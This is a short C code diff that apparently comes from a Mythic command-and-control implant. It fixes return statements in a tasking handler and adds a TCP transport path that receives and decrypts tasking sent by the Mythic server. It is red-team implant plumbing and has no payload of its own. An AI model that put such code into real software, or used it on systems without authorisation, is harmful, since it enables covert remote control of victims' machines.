@@ -301,7 +301,7 @@ VOID TaskProcess(PPARSER tasks)
     UINT32  NumOfMsgs   = 0;
 
     if ( tasks->Buffer == NULL || tasks->Length == 0 )
-        return FALSE;
+        return;
     
     // Determine the type of response from server (get_tasking, post_response, etc)
     Type = ParserGetByte(tasks);
@@ -318,7 +318,7 @@ VOID TaskProcess(PPARSER tasks)
 
 
     if ( NumOfMsgs == 0 )
-        return TRUE;
+        return;
 
     
     for ( UINT32 i = 0; i < NumOfMsgs; i++ ) 
@@ -385,6 +385,27 @@ VOID TaskRoutine()
 
 #endif
 
+#ifdef TCP_TRANSPORT
+
+    PBYTE  pOutData = NULL;
+    SIZE_T OutLen   = 0;
+
+    if ( PackageSendAll(NULL) )
+    {
+        if ( TcpRecieve(&pOutData, &OutLen) )
+        {
+            if ( pOutData != NULL && OutLen != 0 )
+            {
+                ParserNew(&Output, pOutData, OutLen);
+
+                ParserDecrypt(&Output);
+
+                _dbg("Response from Mythic: %d bytes", Output.Length);
+            }
+        }
+    }
+
+#endif
 
     /* Handle all those resposnes */
 
